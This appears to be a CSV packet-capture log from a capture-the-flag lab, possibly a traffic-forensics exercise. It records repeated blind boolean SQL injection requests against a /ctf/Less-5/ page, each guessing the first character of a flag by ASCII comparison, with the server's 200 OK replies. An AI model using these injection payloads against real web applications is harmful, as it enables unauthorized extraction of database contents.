"No.","Time","Source","Destination","Protocol","Length","Info"
"6","1.189723003","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=33--+ HTTP/1.1 "
"9","1.194255153","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18","1.196738281","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=34--+ HTTP/1.1 "
"21","1.199070600","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"30","1.201540617","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=35--+ HTTP/1.1 "
"33","1.203909280","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"42","1.206332464","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=36--+ HTTP/1.1 "
"45","1.208635370","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"54","1.211268502","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=37--+ HTTP/1.1 "
"57","1.213337855","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"66","1.215975504","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=38--+ HTTP/1.1 "
"69","1.218234033","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"78","1.220707529","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=39--+ HTTP/1.1 "
"81","1.223139572","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
